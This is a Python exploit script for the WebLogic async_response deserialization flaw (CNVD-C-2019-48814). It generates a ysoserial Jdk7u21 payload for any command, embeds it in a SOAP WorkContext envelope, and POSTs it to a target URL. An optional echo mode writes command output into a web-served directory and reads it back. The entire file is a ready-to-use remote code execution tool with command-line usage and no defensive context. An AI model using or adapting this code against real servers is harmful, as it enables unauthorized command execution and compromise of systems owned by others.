# __author__ = icematcha
# CNVD-C-2019-48814
import os
import sys
import requests
import time


def ysoserial(cmd):
    ysoserial_payload = f'java -Dhibernate5 -jar E:\\Tools\\ysoserial\\target\\ysoserial-0.0.6-SNAPSHOT-all.jar Jdk7u21 "{cmd}" > weblogic_payload'
    os.system(ysoserial_payload)


def get_exp(file):
    _payload = open(file, 'rb').read()
    _payload = bytearray(_payload)
    payloads = ""
    payloads += '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java><class><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string><void>'''
    payloads += f'\n<array class="byte" length="{len(_payload)}">'
    for i, v in enumerate(_payload):
        if v > 128:
            payloads += f'\n<void index="{i}"><byte>{v-256}</byte></void>'
        else:
            payloads += f'\n<void index="{i}"><byte>{v}</byte></void>'
    payloads += '''
</array>
</void></class>
</java>
</work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>'''
    return payloads


def rce(url, cmd):
    ysoserial(cmd)
    payloads = get_exp(os.path.join(os.getcwd(), 'weblogic_payload'))
    headers = {'Content-Type': 'text/xml;charset=UTF-8'}
    res = requests.post(url, headers=headers, data=payloads)
    return res.text


def Echo(url, cmd, os_name):
    if os_name == 'win':
        cmd = f'cmd /c {cmd} > servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/echoxxxxx'
        rce(url, cmd)
    else:
        cmd = f"/bin/bash -c '{cmd} > servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/echoxxxxx'"
        rce(url, cmd)
    time.sleep(2)
    print(requests.get(f"{'/'.join((url.split('/')[:-1]))}/echoxxxxx").text)


if __name__ == '__main__':
    if len(sys.argv) == 3:
        print(rce(sys.argv[1], sys.argv[2]))
    elif len(sys.argv) == 5 and sys.argv[3] == 'echo':
        Echo(sys.argv[1], sys.argv[2], sys.argv[4])
    else:
        print(f'\nUsage:python3 {os.path.basename(__file__)} [url] [command] [is echo?] [win or linux]')
